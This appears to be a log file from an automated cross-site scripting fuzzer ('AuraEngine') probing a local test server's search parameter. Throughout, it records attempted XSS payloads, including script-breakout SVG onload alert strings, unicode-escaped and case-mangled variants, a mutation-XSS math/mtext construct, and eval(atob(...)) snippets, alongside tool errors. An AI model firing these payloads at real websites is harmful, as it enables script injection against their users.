@@ -1,0 +1,40 @@
+2026-04-06 00:26:48,236 ERROR Critical Error: htmlParser() missing 2 required positional arguments: 'response' and 'encoding'
+2026-04-06 00:34:01,071 INFO [*] AuraEngine detected context: html for http://127.0.0.1:5000/search?q=test
+2026-04-06 00:34:01,071 ERROR AuraEngine Error (generate_payloads): 'score'
+2026-04-06 00:34:01,073 ERROR Critical Error: list index out of range
+2026-04-06 00:35:29,135 INFO [*] AuraEngine detected context: html for http://127.0.0.1:5000/search?q=test
+2026-04-06 00:35:29,135 ERROR AuraEngine Error (generate_payloads): 'score'
+2026-04-06 00:35:46,874 INFO [*] Analyzing failure: Status 200 for payload ()
+2026-04-06 00:35:51,384 INFO [*] Analyzing failure: Status 200 for payload ()
+2026-04-06 00:35:55,693 INFO [*] Analyzing failure: Status 200 for payload ()
+2026-04-06 00:35:59,966 INFO [*] Analyzing failure: Status 200 for payload ()
+2026-04-06 00:36:04,237 INFO [*] Analyzing failure: Status 200 for payload `
+2026-04-06 00:36:08,634 INFO [*] Analyzing failure: Status 200 for payload %2528%2529
+2026-04-06 00:36:13,078 INFO [*] Analyzing failure: Status 200 for payload %2528%2529
+2026-04-06 00:36:17,356 INFO [*] Analyzing failure: Status 200 for payload %2528%2529
+2026-04-06 00:36:21,712 INFO [*] Analyzing failure: Status 200 for payload \u0028\u0029
+2026-04-06 00:36:25,985 INFO [*] Analyzing failure: Status 200 for payload \u0028\u0029
+2026-04-06 00:36:25,996 INFO [*] AuraEngine detected context: html for http://127.0.0.1:5000/search?q=test
+2026-04-06 00:36:25,996 ERROR AuraEngine Error (generate_payloads): 'score'
+2026-04-06 00:36:30,228 INFO [*] Analyzing failure: Status 200 for payload ()
+2026-04-06 00:36:34,475 INFO [*] Analyzing failure: Status 200 for payload \u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u003c\u0073\u0076\u0067\u002f\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e
+2026-04-06 00:36:38,727 INFO [*] Analyzing failure: Status 200 for payload \u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u003c\u0073\u0076\u0067\u002f\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e
+2026-04-06 00:36:42,988 INFO [*] Analyzing failure: Status 200 for payload \u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u003c\u0073\u0076\u0067\u002f\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e
+2026-04-06 00:36:47,254 INFO [*] Analyzing failure: Status 200 for payload </ScRiPt><SvG/OnLoAd=aLeRt(1)>
+2026-04-06 00:36:51,527 INFO [*] Analyzing failure: Status 200 for payload </ScRiPt><SvG/OnLoAd=aLeRt(1)>
+2026-04-06 00:36:55,800 INFO [*] Analyzing failure: Status 200 for payload <math><mtext><option><input onfocus="</script><svg/onload=alert(1)>" autofocus></option></mtext></math>
+2026-04-06 00:37:00,056 INFO [*] Analyzing failure: Status 200 for payload <math><mtext><option><input onfocus="</script><svg/onload=alert(1)>" autofocus></option></mtext></math>
+2026-04-06 00:37:04,309 INFO [*] Analyzing failure: Status 200 for payload ><
+2026-04-06 00:37:08,561 INFO [*] Analyzing failure: Status 200 for payload eval(atob('Pjw='))
+2026-04-06 00:37:08,571 INFO [*] AuraEngine detected context: html for http://127.0.0.1:5000/search?q=test
+2026-04-06 00:37:08,571 ERROR AuraEngine Error (generate_payloads): 'score'
+2026-04-06 00:37:12,816 INFO [*] Analyzing failure: Status 200 for payload eval(atob('KCk='))
+2026-04-06 00:37:17,068 INFO [*] Analyzing failure: Status 200 for payload eval(atob('KCk='))
+2026-04-06 00:37:21,304 INFO [*] Analyzing failure: Status 200 for payload \()
+2026-04-06 00:37:25,569 INFO [*] Analyzing failure: Status 200 for payload %2528%2529
+2026-04-06 00:37:29,838 INFO [*] Analyzing failure: Status 200 for payload \x3e\x3c
+2026-04-06 00:37:34,113 INFO [*] Analyzing failure: Status 200 for payload \x3e\x3c
+2026-04-06 00:37:38,348 INFO [*] Analyzing failure: Status 200 for payload ><
+2026-04-06 00:37:42,584 INFO [*] Analyzing failure: Status 200 for payload %2528%2529
+2026-04-06 00:37:46,958 INFO [*] AuraEngine detected context: html for http://127.0.0.1:5000/search?q=test
+2026-04-06 00:37:46,958 ERROR AuraEngine Error (generate_payloads): 'score'
